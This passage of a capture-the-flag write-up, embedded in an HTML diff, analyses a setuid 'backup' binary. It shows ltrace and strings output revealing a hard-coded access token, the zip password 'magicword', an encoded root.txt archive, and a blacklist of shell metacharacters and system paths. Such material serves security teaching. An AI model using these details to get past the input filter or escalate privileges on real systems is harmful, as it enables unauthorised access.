+                <span style="color:#ffdd00;font-weight:400">geteuid()</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1000<br>
+                setuid<span style="color:#ff9d00;font-weight:700">(</span>1000<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0<br>
+                strcmp<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"-q"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"-q"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0<br>
+                [...]<br>
+                fopen<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/etc/myplace/keys"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"r"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x8da1008<br>
+                [...]<br>
+                strcmp<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"45fac180e9eee72f4fd2d9386ea7033e"</span>...,&nbsp;<span style="color:#3ad900;font-weight:400">"45fac180e9eee72f4fd2d9386ea7033e"</span>...<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;=&nbsp;0<br>
+                [...]<br>
+                strstr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">".."</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strstr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"/root"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">';'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'&amp;'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'`'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'$'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strchr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'|'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strstr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"//"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                strcmp<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1<br>
+                strstr<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"test"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"/etc"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;nil<br>
+                [...]<br>
+                sprintf<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/tmp/.backup_2039207999"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"/tmp/.backup_%i"</span>,&nbsp;2039207999<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;=&nbsp;23<br>
+                sprintf<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/usr/bin/zip&nbsp;-r&nbsp;-P&nbsp;magicword&nbsp;/tm"</span>...,&nbsp;<span style="color:#3ad900;font-weight:400">"/usr/bin/zip&nbsp;-r&nbsp;-P&nbsp;magicword&nbsp;%s&nbsp;"</span>...,&nbsp;<span style="color:#3ad900;font-weight:400">"/tmp/.backup_2039207999"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"test"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;=&nbsp;69<br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/usr/bin/zip&nbsp;-r&nbsp;-P&nbsp;magicword&nbsp;/tm"</span>...&nbsp;&lt;no&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;...&gt;<br>
+                [...]<br>
+                access<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/tmp/.backup_2039207999"</span>,&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;-1<br>
+                remove<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/tmp/.backup_2039207999"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;-1<br>
+                fclose<span style="color:#ff9d00;font-weight:700">(</span>0x8da1008<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0<br>
+                +++&nbsp;exited&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>status&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;+++
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>7b) No output?</strong></h3><br>
+        If you check the strings of the binary, you'll see some error messages:<br>
+        ◇ <code>Could not open file</code><br>
+        ◇ <code>Validated access token</code><br>
+        ◇ <code>Ah-ah-ah! You didn't say the magic word!</code><br>
+        ◇ <code>The target path doesn't exist</code><br>
+        and ASCII art of a computer.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;strings&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;-n&nbsp;10<br>
+                &nbsp;%s[<span style="color:#ff9d00;font-weight:700">!</span>]%s&nbsp;%s<br>
+                &nbsp;%s[+]%s&nbsp;%s<br>
+                &nbsp;%s[+]%s&nbsp;Starting&nbsp;archiving&nbsp;%s<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____________________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;_____________________________________________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secure&nbsp;Backup&nbsp;v1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>_____________________________________________<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>____________________________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>______________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-<span style="color:#3ad900;font-weight:400">'&nbsp;&nbsp;&nbsp;&nbsp;.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.&nbsp;&nbsp;---&nbsp;`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'</span>.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.&nbsp;&nbsp;.-.-.<span style="color:#333333;font-weight:400">`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`.&nbsp;.-.-.-.`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.-.&nbsp;.-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----.&nbsp;.-.-.-.-.`</span>-_<br>
+                &nbsp;_-<span style="color:#3ad900;font-weight:400">'.-.-.-.-.-.&nbsp;.---.-.&nbsp;.-----------------------------.&nbsp;.-.---.&nbsp;.---.-.-.-.`-_<br>
+                :-----------------------------------------------------------------------------:<br>
+                `---._.-----------------------------------------------------------------._.---'</span><br>
+                Could&nbsp;not&nbsp;open&nbsp;<span style="color:#ff9d00;font-weight:700">file</span><br>
+                Validated&nbsp;access&nbsp;token<br>
+                Ah-ah-ah<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;You&nbsp;didnt&nbsp;say&nbsp;the&nbsp;magic&nbsp;word<span style="color:#ff9d00;font-weight:700">!</span><br>
+                Finished<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;Encoded&nbsp;backup&nbsp;is&nbsp;below<span style="color:#ff9d00;font-weight:700">:</span><br>
+                UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH<span style="color:#ff9d00;font-weight:700">/</span>hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK<span style="color:#ff9d00;font-weight:700">/</span>oan4wWPabhw<span style="color:#ff9d00;font-weight:700">/</span>2rwaaJSXucU+pLgZorY67Q<span style="color:#ff9d00;font-weight:700">/</span>Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE<span style="color:#ff9d00;font-weight:700">/</span>ZiS1S+rPgz<span style="color:#ff9d00;font-weight:700">/</span>e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe<span style="color:#ff9d00;font-weight:700">/</span>BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz<span style="color:#ff9d00;font-weight:700">/</span>7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY<span style="color:#ff9d00;font-weight:700">/</span>a4AZKO<span style="color:#ff9d00;font-weight:700">/</span>GtVMULlrpbpIFqZ98zwmROFstmPl<span style="color:#ff9d00;font-weight:700">/</span>cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd<span style="color:#ff9d00;font-weight:700">/</span>EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA<span style="color:#ff9d00;font-weight:700">/</span>jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK<span style="color:#ff9d00;font-weight:700">/</span>kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate<span style="color:#ff9d00;font-weight:700">/</span>Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx<span style="color:#ff9d00;font-weight:700">/</span>XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2<span style="color:#ff9d00;font-weight:700">/</span>F+X<span style="color:#ff9d00;font-weight:700">/</span>OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR<span style="color:#ff9d00;font-weight:700">/</span>AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg<span style="color:#ff9d00;font-weight:700">/</span>RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn<span style="color:#ff9d00;font-weight:700">/</span>8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG<span style="color:#ff9d00;font-weight:700">/</span>YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD<span style="color:#ff9d00;font-weight:700">/</span>tgtUHcFBLAQI<span style="color:#ff9d00;font-weight:700">/</span>AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>.backup_%i<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/zip</span>&nbsp;-r&nbsp;-P&nbsp;magicword&nbsp;%s&nbsp;%s&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>base64&nbsp;-w0&nbsp;%s<br>
+                The&nbsp;target&nbsp;path&nbsp;doesnt&nbsp;exist
+            </div>
+        </div><br>
+        <br>
+        Considering we're not getting any output, and there are strings in the binary to imply there is output, I'm guessing that <code>-q</code> is a quiet switch that surpresses any output.<br>
+        <br>
+        If you run the binary without <code>-q</code>, the program just exits.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;ltrace&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span><br>
+                &lt;e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                __libc_start_main<span style="color:#ff9d00;font-weight:700">(</span>0x80489fd,&nbsp;3,&nbsp;0xffd2c2d4,&nbsp;0x80492c0&nbsp;&lt;unfinished&nbsp;...&gt;<br>
+                <span style="color:#ffdd00;font-weight:400">geteuid()</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1000<br>
+                setuid<span style="color:#ff9d00;font-weight:700">(</span>1000<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0<br>
+                <span style="color:#ff9d00;font-weight:700">exit(</span>1&nbsp;&lt;no&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;...&gt;<br>
+                +++&nbsp;exited&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>status&nbsp;1<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;+++
+            </div>
+        </div><br>
+        <br>
+        If you run the binary with a random argument in place of <code>-q</code>, we get an output!<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;1&nbsp;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span><br>
+                &lt;fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;<span style="color:#ff9d00;font-weight:700">test</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____________________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;_____________________________________________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
